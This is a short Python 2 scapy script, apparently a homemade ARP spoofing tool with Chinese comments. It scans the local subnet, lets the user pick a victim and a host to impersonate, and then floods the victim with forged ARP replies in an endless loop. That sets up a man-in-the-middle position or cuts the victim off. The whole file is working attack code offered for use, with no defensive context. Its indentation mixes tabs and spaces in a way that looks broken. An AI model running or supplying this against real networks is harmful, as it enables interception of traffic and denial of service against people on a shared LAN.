#!/usr/bin/python
#coding=utf-8
from scapy.all import *
import sys
import getopt
import socket
import struct
import fcntl

def usage():
	print "usage: python arpspoof.py"
	print "python arpspoof.py -t 192.168.1.1 192.168.1.100"

def getip(ethname):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0X8915, struct.pack('256s', ethname[:15]))[20:24])

#############
# arp scan  #
#############

def arpscan(Lan):
	e = Ether()
	e.dst = "ff:ff:ff:ff:ff:ff"
	a = ARP()
	a.pdst=Lan
	ans,unans=srp(e/a,timeout=2)
	#ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%"))
	#arping(sys.argv[1])
	ipaddr_mac=[]
	data={}
	for s,r in ans:
		ipaddr_mac.append(s[Ether].pdst)
		ipaddr_mac.append(r[ARP].hwsrc)
		data[s[Ether].pdst]=r[ARP].hwsrc
	return ipaddr_mac, data

 #################
# arp send      #
#################
def arpsend(target, mac, host, num=-1):
    a=ARP()
	#op代表ARP数据包类型，01为请求包，02为应答包
	a.op=2
	#pdst目的端IP地址
    a.pdst=target
	#hwdst目的端MAC地址
    a.hwdst=mac
	#psrc发送端IP地址
	a.psrc=host
	#hwsrc发送端MAC地址
	a.hwsrc="bb:bb:bb:cc:cc:cc"
        send(a, loop=1, count=num)

def arpauto(Lan):
	s,d=arpscan(Lan)
	for i in range(len(s)/2):
		print "[%d] %s %s" %(i, s[i*2+1], s[i*2])

 	D0=int(raw_input("[Add-0]:"))
	print "Target0:", s[D0*2], d[s[D0*2]]

	D1=int(raw_input("[Add-1]:"))
	print "Target1", s[D1*2], d[s[D1*2]]

	target=s[D0*2]
	mac=d[s[D0*2]]
	host=s[D1*2]
	return target, mac, host

def arpmanually(Lan):
	s,d=arpscan(Lan)
	mac=d[Lan]
	return mac

if __name__=="__main__":
	if len(sys.argv[1:]) == 0:
		Lan = getip('eth0')+"/24"
		target, mac, host = arpauto(Lan)
	else:
		try:
			opts, args = getopt.getopt(sys.argv[1:], "ht:p:v", ["help", "target="])
		except getopt.GetoptError, err:
			print str(err)
			usage()
			sys.exit(2)
		for o, a in opts:
			if o in ("-h", "--help"):
				usage()
				sys.exit()
			elif o in ("-t", "--target"):
				target = a
				mac = arpmanually(target)
			elif o == "-v":
				print "arpspoof.py version 0.1"
				sys.exit()
			if o == "-p":
				host = a
	arpsend(target, mac, host)
